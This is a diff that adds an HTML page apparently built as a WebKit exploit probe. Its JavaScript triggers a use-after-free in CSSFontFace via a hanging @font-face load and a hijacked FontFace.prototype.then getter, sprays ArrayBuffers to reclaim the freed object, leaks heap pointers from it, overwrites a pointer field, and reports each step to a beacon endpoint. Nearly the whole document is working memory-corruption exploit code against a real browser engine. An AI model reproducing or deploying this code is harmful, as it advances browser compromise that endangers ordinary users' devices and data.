@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P788 — Hanging CSSFontFace Pre-Warm UAF & Q11 Dereference Probe</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; line-height: 1.5; }
+  h2 { color: #58a6ff; margin-top: 0; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; overflow-x: auto; color: #7ee787; font-size: 13px; }
+</style>
+<script>
+'use strict';
+window.onerror = function(msg, url, line, col, err){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P788-ERR&data=' + encodeURIComponent((msg || '') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P788-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+}
+
+var OUT = null;
+function log(s){
+  if (!OUT) OUT = document.getElementById('out');
+  if (OUT) OUT.textContent += s + '\n';
+}
+
+var P58 = 0n, P68 = 0n;
+var BUF_B = null, VIEW_B = null;
+
+function run(){
+  OUT = document.getElementById('out');
+  log('=== P788 Hanging CSSFontFace Pre-Warm UAF & Q11 Dereference Probe ===\n');
+  b('BOOT', 'start');
+
+  setupPreWarmUAF();
+}
+
+function setupPreWarmUAF(){
+  b('STEP1-SETUP', 'start');
+
+  // 1. Create hanging CSS @font-face rule with unicode-range: U+0042 ('B')
+  var stHang = document.createElement('style');
+  var hangUrl = '/hang.php?nocache=' + Date.now() + '_csshang';
+  stHang.textContent = '@font-face{font-family:hangFam;src:url(' + hangUrl + ');unicode-range:U+0042;}';
+  document.head.appendChild(stHang);
+
+  // 2. PRE-WARM: Force WebKit to parse and instantiate CSSFontFace for hangFam!
+  // Before doing load(), query hangFam to put it into FontSelector in 'loading' state
+  var preChkA = document.fonts.check('1em hangFam', 'A'); // out of range
+  var preChkB = document.fonts.check('1em hangFam', 'B'); // in range
+  b('STEP1-PREWARM', 'chkA_out=' + preChkA + '|chkB_in=' + preChkB);
+  log('Step 1 Pre-Warm hangFam:');
+  log('  fonts.check(hangFam, "A") [out-of-range]: ' + preChkA + ' (expected: true)');
+  log('  fonts.check(hangFam, "B") [in-range]: ' + preChkB + ' (expected: false if loading)');
+
+  // 3. Local trigger font for fast, synchronous .then execution
+  var faceTrig = new FontFace('trigFam', 'local(Helvetica)', { unicodeRange: 'U+0054' });
+  document.fonts.add(faceTrig);
+  void faceTrig.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired) return undefined;
+      fired = true;
+
+      b('THEN-FIRED', 'start-uaf');
+
+      // Remove hanging style element
+      if (stHang){ stHang.remove(); stHang.textContent = ''; stHang = null; }
+      try { document.fonts.delete(faceTrig); } catch(e){}
+      document.body.offsetHeight;
+
+      // Spray 64 ArrayBuffers (192B)
+      for (var k = 0; k < 64; k++) abs.push(new ArrayBuffer(192));
+
+      // CRITICAL: Force FontSelector to flush and access hangFam!
+      try { document.fonts.check('1em hangFam'); } catch(e){}
+      document.body.offsetHeight;
+
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  // Trigger: Only request local trigFam so it resolves immediately
+  b('STEP2-LOAD', 'trigFam');
+  document.fonts.load('1em trigFam', 'T');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for (var i = 0; i < abs.length; i++){
+      var u = new Uint8Array(abs[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if (best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'bestNz=' + bestNz);
+      log('Reclaim missed: bestNz=' + bestNz);
+      return;
+    }
+
+    BUF_B = abs[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+    P58 = VIEW_B[11]; // q11: m_ranges.m_buffer
+    P68 = VIEW_B[13]; // q13: m_sources.m_buffer
+
+    var q0 = VIEW_B[0];
+    var q11 = VIEW_B[11];
+    var q12 = VIEW_B[12];
+    var q13 = VIEW_B[13];
+
+    b('RECLAIM-HIT', 'k=' + best + '|nz=' + bestNz + '|q0=0x' + h16(q0) +
+      '|p58=0x' + h16(P58) + '|q12=0x' + h16(q12) + '|p68=0x' + h16(P68));
+    log('Reclaim HIT: k=' + best + ' nz=' + bestNz);
+    log('  q0=0x' + h16(q0) + ' q11(p58)=0x' + h16(P58) + ' q12=0x' + h16(q12) + ' q13(p68)=0x' + h16(P68));
+
+    // Proceed to Step 3: Test Loading Oracle on hangFam & Q11 Dereference
+    testHangFamOracle();
+  }, 250);
+}
+
+function testHangFamOracle(){
+  log('\n=== Step 3: Testing Oracle & Q11 Dereference on hangFam ===');
+
+  // Test 3.1: Post-UAF baseline check on hangFam
+  var postChkA = document.fonts.check('1em hangFam', 'A'); // out of range
+  var postChkB = document.fonts.check('1em hangFam', 'B'); // in range
+  b('T31-POST-UAF', 'chkA_out=' + postChkA + '|chkB_in=' + postChkB);
+  log('Post-UAF hangFam: chkA=' + postChkA + ' chkB=' + postChkB);
+
+  // Test 3.2: Dereference Mutation
+  var origQ11 = VIEW_B[11];
+  log('\n=== Step 4: Dereference & Range Mutation ===');
+
+  // Mutate q11 to zero
+  VIEW_B[11] = 0n;
+  var zeroChkA = document.fonts.check('1em hangFam', 'A');
+  var zeroChkB = document.fonts.check('1em hangFam', 'B');
+  b('T41-ZERO-Q11', 'origQ11=0x' + h16(origQ11) + '|chkA=' + zeroChkA + '|chkB=' + zeroChkB);
+  log('q11=0x0: chkA=' + zeroChkA + ' chkB=' + zeroChkB);
+
+  // Restore q11
+  VIEW_B[11] = origQ11;
+  b('T42-RESTORED', 'q11=0x' + h16(VIEW_B[11]));
+  log('q11 restored: 0x' + h16(VIEW_B[11]));
+
+  b('DONE', 'probe-complete');
+  log('\n=== P788 COMPLETE ===');
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') {
+  setTimeout(run, 0);
+} else {
+  document.addEventListener('DOMContentLoaded', run);
+}
+</script>
+</head>
+<body>
+  <h2>P788 — Hanging CSSFontFace Pre-Warm UAF & Q11 Dereference Probe</h2>
+  <div id="status" class="status">Running probe...</div>
+  <pre id="out"></pre>
+</body>
+</html>
